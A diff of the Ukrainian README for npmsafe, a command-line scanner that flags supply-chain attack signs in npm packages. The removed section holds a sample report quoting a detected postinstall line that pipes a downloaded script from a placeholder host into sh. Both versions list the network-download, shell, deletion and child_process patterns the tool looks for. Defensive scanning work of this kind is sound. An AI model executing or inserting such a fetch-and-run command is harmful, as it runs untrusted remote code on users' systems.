@@ -1,75 +1,66 @@
-# npmsafe 🛡️
+﻿# npmsafe
 
-npmsafe — потужний інструмент для захисту від supply-chain атак у npm екосистемі. Перевіряє пакети до інсталяції через AST-аналіз JavaScript коду, виявлення підозрілих lifecycle скриптів, генерацію детальних JSON-звітів та інтеграцію в CI/CD пайплайни.
+npmsafe — CLI-утиліта для аналізу npm-пакетів на ознаки supply-chain атак. Інструмент читає `package.json`, виконує AST-аналіз JavaScript-файлів і формує консолідований звіт про ризики.
 
-## 🚀 Особливості
+## Можливості
+- **AST-евристики**: виявлення `eval`, `new Function`, `require('child_process')`, деструктуризації та викликів `child_process` (у тому числі через псевдоніми).
+- **Перевірка lifecycle-скриптів**: підсвітка небезпечних `postinstall`, `preinstall`, `install`, `prepare` зі скачуванням файлів, shell-командами тощо.
+- **Оцінка ризику**: рівні `safe`, `low`, `suspicious`, `malicious` з ваговою системою, що враховує сумарну суворість інцидентів.
+- **Формати звіту**: текстовий режим за замовчуванням або вивід у JSON для інтеграції з CI/CD.
+- **Суворий режим**: прапорець `--strict` підвищує будь-який `suspicious`/`low` до помилки (`exit code 2`).
 
-- **AST-аналіз**: Виявляє небезпечні патерни (`eval`, `new Function`, `child_process`, `exec`)
-- **Lifecycle скрипти**: Перевіряє підозрілі `postinstall`, `preinstall`, `prepare` скрипти
-- **Рівні ризику**: `safe` | `suspicious` | `malicious` з детальним поясненням
-- **JSON звіти**: Структуровані дані для автоматизації та аналітики
-- **CI/CD інтеграція**: Exit codes (0,1,2) для автоматичних перевірок
-- **Швидкість**: Оптимізований аналіз з обмеженням глибини сканування
-
-## 📦 Встановлення
-
+## Встановлення
 ```bash
 npm install -g npmsafe
 ```
-
-Або для локального використання:
+або локально в репозиторій та запуск через `npx`:
 ```bash
-npm install npmsafe
-npx npmsafe [options] <path>
+npm install npmsafe --save-dev
+npx npmsafe --help
 ```
 
-## 🔧 Використання
+Рекомендована версія Node.js — **>=18** (у CI виконується на Node 20).
 
-### Базове використання
-
+## Використання
 ```bash
-# Перевірити пакет у поточній директорії
+# Аналіз каталогу (пошук package.json автоматично)
 npmsafe .
 
-# Перевірити конкретний пакет
-npmsafe /path/to/package
+# Перевірка конкретного package.json
+npmsafe ./packages/example/package.json
 
-# Перевірити за package.json файлом
-npmsafe package.json
-```
-
-### Опції командного рядка
-
-```bash
-# Детальний вивід
-npmsafe . --verbose
-
-# JSON формат виводу
+# JSON-звіт
 npmsafe . --format json
 
-# Суворий режим (suspicious = malicious)
-npmsafe . --strict
-
-# Показати версію
-npmsafe --version
-
-# Показати довідку
-npmsafe --help
+# Детальна інформація та суворий режим
+npmsafe . --verbose --strict
 ```
 
-## 📊 Приклади виводу
+### Коди завершення
+| Рівень ризику | Exit code | Пояснення |
+| ------------- | --------- | --------- |
+| `safe`        | 0         | Небезпечних патернів не знайдено |
+| `low`         | 1 (2 зі `--strict`) | Низький ризик: lifecycle без небезпечних команд, дрібні попередження |
+| `suspicious`  | 1 (2 зі `--strict`) | Виявлено середню загрозу, потрібен ручний аудит |
+| `malicious`   | 2         | Критичні ознаки компрометації |
+| `error`       | 3         | Внутрішня помилка виконання |
 
-### Текстовий формат
+## Що перевіряється
+- **Lifecycle-скрипти**: мережеві завантаження (`curl`, `wget`), shell-команди, видалення файлів, зміна прав доступу.
+- **`child_process`**: імпорт через `require`, `import`, присвоєння у змінні, деструктуризація (`const { exec } = require('child_process')`), виклики через псевдоніми (`cp.exec()`, `run()` після деструктуризації).
+- **Динамічне виконання коду**: `eval`, `new Function`, великі/складні для парсингу файли.
+- **Статистика**: кількість перевірених файлів, знайдених скриптів і AST-попереджень.
 
+## Приклад текстового звіту
 ```
 🔍 Аналіз безпеки пакету: suspicious-package
-📊 Рівень ризику: 🟡 SUSPICIOUS
+📊 Рівень ризику: 🟠 SUSPICIOUS
 
 ⚠️  Виявлені проблеми:
 1. script: Підозрілий postinstall скрипт: Завантаження файлів з мережі
    Розташування: package.json:scripts.postinstall
-2. ast: Використання eval() - небезпечно для виконання коду
-   Розташування: index.js:15
+2. ast: Виконання системних команд через exec()
+   Розташування: malicious.js:3
 
 📈 Статистика:
    Перевірено файлів: 3
@@ -77,187 +68,23 @@ npmsafe --help
    AST-попереджень: 1
 ```
 
-### JSON формат
+## Розробка
+1. Клонувати репозиторій та встановити залежності:
+   ```bash
+   git clone <repo-url>
+   cd npmsafe
+   npm install
+   ```
+2. Запуск лінтів/тестів:
+   ```bash
+   npm test
+   ```
+   Тести створюють тимчасові пакети, проганяють аналізатор і перевіряють ключові сценарії (`eval`, lifecycle-скрипти, псевдоніми `child_process`).
+3. Додавати нові евристики бажано разом із регресійними тестами у `test/test.js`.
 
-```json
-{
-  "packageName": "suspicious-package",
-  "version": "1.0.0",
-  "risk": "suspicious",
-  "issues": [
-    {
-      "type": "script",
-      "severity": "high", 
-      "description": "Підозрілий postinstall скрипт: Завантаження файлів з мережі",
-      "details": "curl -s http://example.com/script.sh | sh",
-      "location": "package.json:scripts.postinstall"
-    }
-  ],
-  "stats": {
-    "filesScanned": 3,
-    "suspiciousScripts": 1,
-    "astWarnings": 1
-  },
-  "timestamp": "2025-01-15T10:30:00.000Z"
-}
-```
+## CI
+- Файл `.github/workflows/ci.yml` запускає `npm ci` та `npm test` для `push`/`pull_request`.
+- Кеш npm увімкнений для швидшого прогону.
 
-## 🚨 Типи загроз що виявляються
-
-### Lifecycle скрипти
-- `postinstall`, `preinstall`, `install`, `prepare`
-- Завантаження файлів з мережі (`curl`, `wget`, `fetch`)
-- Виконання shell команд (`sh`, `bash`, `exec`)
-- Видалення файлів (`rm -rf`, `rmdir`)
-- Зміна прав доступу (`chmod`)
-
-### AST патерни
-- `eval()` - динамічне виконання коду
-- `new Function()` - конструктор функцій
-- `child_process` - системні команди
-- `exec`, `spawn`, `fork` - процеси
-- Обфусковані/великі файли
-
-## 🔄 Рівні ризику
-
-| Рівень | Exit Code | Опис |
-|--------|-----------|------|
-| `safe` | 0 | Проблем не виявлено |
-| `suspicious` | 1 | Підозрілі патерни, потребує перевірки |
-| `malicious` | 2 | Високий ризик, не рекомендується |
-| `error` | 3 | Помилка аналізу |
-
-## 🔧 CI/CD Інтеграція
-
-### GitHub Actions
-
-```yaml
-name: npm Security Check
-on: [push, pull_request]
-
-jobs:
-  security:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Setup Node.js
-        uses: actions/setup-node@v3
-        with:
-          node-version: '18'
-      
-      - name: Install npmsafe
-        run: npm install -g npmsafe
-      
-      - name: Security scan
-        run: npmsafe . --format json > security-report.json
-      
-      - name: Upload report
-        uses: actions/upload-artifact@v3
-        if: always()
-        with:
-          name: security-report
-          path: security-report.json
-```
-
-### GitLab CI
-
-```yaml
-security_scan:
-  image: node:18
-  script:
-    - npm install -g npmsafe
-    - npmsafe . --format json > security-report.json
-  artifacts:
-    reports:
-      junit: security-report.json
-    when: always
-  only:
-    - merge_requests
-    - main
-```
-
-### Jenkins Pipeline
-
-```groovy
-pipeline {
-    agent any
-    
-    stages {
-        stage('Security Scan') {
-            steps {
-                sh 'npm install -g npmsafe'
-                sh 'npmsafe . --format json > security-report.json'
-                
-                publishHTML([
-                    allowMissing: false,
-                    alwaysLinkToLastBuild: true,
-                    keepAll: true,
-                    reportDir: '.',
-                    reportFiles: 'security-report.json',
-                    reportName: 'NPM Security Report'
-                ])
-            }
-        }
-    }
-}
-```
-
-## 🛠️ API використання
-
-```javascript
-const { analyzePackage } = require('npmsafe');
-
-async function checkPackage() {
-  const result = await analyzePackage('./path/to/package', {
-    verbose: true,
-    strict: false
-  });
-  
-  console.log(`Risk level: ${result.risk}`);
-  console.log(`Issues found: ${result.issues.length}`);
-  
-  return result.risk === 'safe';
-}
-```
-
-## ⚡ Продуктивність
-
-- **Швидкість**: ~1-5 секунд для середнього пакету
-- **Обмеження**: Максимум 50 JS файлів, глибина сканування 3 рівні
-- **Пам'ять**: Мінімальне споживання через потоковий аналіз
-
-## 🤝 Розробка
-
-```bash
-# Клонування репозиторію
-git clone https://github.com/pilipandr770/npmsafe.git
-cd npmsafe
-
-# Встановлення залежностей  
-npm install
-
-# Запуск тестів
-npm test
-
-# Тестування CLI
-npm start -- ./test-package --verbose
-```
-
-## 📄 Ліцензія
-
-MIT License - див. [LICENSE](LICENSE) файл.
-
-## 🐛 Повідомлення про помилки
-
-Будь ласка, створюйте issues на [GitHub](https://github.com/pilipandr770/npmsafe/issues) з детальним описом проблеми.
-
-## 🌟 Контрибуція
-
-Приймаємо pull requests! Будь ласка:
-1. Створіть issue для обговорення змін
-2. Додайте тести для нової функціональності
-3. Дотримуйтеся існуючого стилю коду
-
----
-
-**npmsafe** - ваш надійний захисник від supply-chain атак у npm! 🛡️
+## Ліцензія
+Проєкт розповсюджується за MIT License (див. [LICENSE](LICENSE)).
